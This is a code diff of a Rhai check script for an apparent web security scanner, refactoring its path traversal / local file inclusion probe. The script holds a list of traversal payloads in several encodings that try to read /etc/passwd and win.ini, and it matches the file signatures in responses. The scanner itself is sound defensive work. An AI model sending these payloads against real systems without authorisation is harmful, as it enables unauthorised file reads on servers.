@@ -1,48 +1,78 @@
-// check-path-traversal.rhai — operator/agent command
-// `check.path_traversal { url, param }`: confirm path traversal / local file
-// inclusion by requesting a well-known system file and matching its signature.
-// OWASP A01 Broken Access Control / A03 Injection.
+// check-path-traversal.rhai — check `path_traversal`, class `path-traversal`.
 //
-// ACTIVE: scope-/rate-gated GETs, invoked only. It reads a universally-present
-// marker file (/etc/passwd, win.ini) to prove traversal; it exfiltrates nothing
-// else. For authorised testing only.
+// Where a value becomes part of a filesystem path, enough parent-directory
+// steps walk out of the document root. The probe asks for one of two files
+// every system has and nobody minds showing — the POSIX account list and the
+// Windows ini — and matches their signature. Nothing else is read, which is
+// what keeps a traversal proof benign.
+//
+// `wants_traits: ["filename"]` keeps the check off values that never look
+// like a path, unless the profile asks for `speed: thorough` (spec D4).
+// OWASP A01 Broken Access Control / A03 Injection. CWE-22.
 const NAME = "check-path-traversal";
 const API  = "1";
 
-fn q(url, param, value) {
-    let sep = if url.contains("?") { "&" } else { "?" };
-    `${url}${sep}${url_encode(param)}=${value}`
-}
+const NIX_SIG = "root:.*:0:0:";
+const WIN_SIG = "(?i)\\[(fonts|extensions|mci extensions)\\]";
+
+const META = #{
+    id: "path_traversal",
+    name: "Path traversal / local file inclusion",
+    class: "path-traversal",
+    lanes: ["http"],
+    kinds: ["query", "body_param", "json_value", "path_filename", "multipart_filename"],
+    intensity: "medium",
+    cost: "medium",
+    technique: "reflected",
+    severity: "critical",
+    confidence_max: "firm",
+    needs_baseline: false,
+    wants_traits: ["filename"],
+    cwe: 22,
+    description: "Walks out of the document root with the usual traversal encodings and reports when a well-known system file comes back.",
+    remediation: "Resolve the path and verify it stays inside the intended directory; prefer an opaque id over a caller-supplied name.",
+};
 
 fn load(reg) {
-    reg.add_command("check.path_traversal", "Confirm path traversal / LFI in { url, param }", |args| {
-        if type_of(args.url) != "string" || type_of(args.param) != "string" {
-            return "usage: check.path_traversal { url, param }";
-        }
-        let nix = "root:.*:0:0:";
-        let win = "(?i)\\[(fonts|extensions|mci extensions)\\]";
+    reg.add_check(META, |point| {
+        let base = if type_of(point.example) == "string" { point.example } else { "index.html" };
+        // Plain, double-encoded (the lane percent-encodes the value once, spec
+        // D4, so `%2f` reaches the wire as `%252f` and only a server that
+        // decodes twice sees a slash), doubled-up, absolute, and the Windows
+        // pair with real backslashes.
         let payloads = [
             "../../../../../../../../etc/passwd",
             "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
             "....//....//....//....//etc/passwd",
             "/etc/passwd",
-            "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
+            "..\\..\\..\\..\\..\\windows\\win.ini",
             "../../../../../../windows/win.ini",
         ];
-        for pl in payloads {
-            let r = http.send(#{ method: "GET", url: q(args.url, args.param, pl) });
-            if r.status == () { continue; }
-            if regex_match(nix, r.body) || regex_match(win, r.body) {
-                finding(#{
-                    name: "Path traversal / local file inclusion",
-                    severity: "critical",
-                    flow_id: r.flow_id,
-                    detail: `\"${args.param}\" on ${args.url} returned the contents of a system file via traversal payload (${pl}).`,
-                    tags: ["path-traversal", "lfi", "active", "owasp-a01", "owasp-a03"],
-                });
-                return "VULNERABLE: path traversal confirmed";
+
+        for payload in payloads {
+            let reply = probe.send(payload);
+            let signature = if regex_match(NIX_SIG, reply.body) { NIX_SIG }
+                else if regex_match(WIN_SIG, reply.body) { WIN_SIG } else { () };
+            if signature != () {
+                return #{
+                    outcome: "vulnerable",
+                    confidence: "firm",
+                    evidence: #{ payload: payload, matched: "system file signature" },
+                    detail: `"${point.name}" returned the contents of a system file for traversal payload ${payload}.`,
+                    poc_hint: #{
+                        matchers: [ #{ type: "regex", regex: signature, part: "body" } ],
+                        control: #{
+                            payload: base,
+                            matchers: [ #{ not: #{ type: "regex", regex: signature, part: "body" } } ],
+                        },
+                    },
+                };
             }
         }
-        "no path traversal confirmed"
+        #{
+            outcome: "clean", confidence: "firm",
+            evidence: #{ payload: payloads[0], matched: () },
+            detail: "No traversal encoding reached a file outside the document root.",
+        }
     });
 }
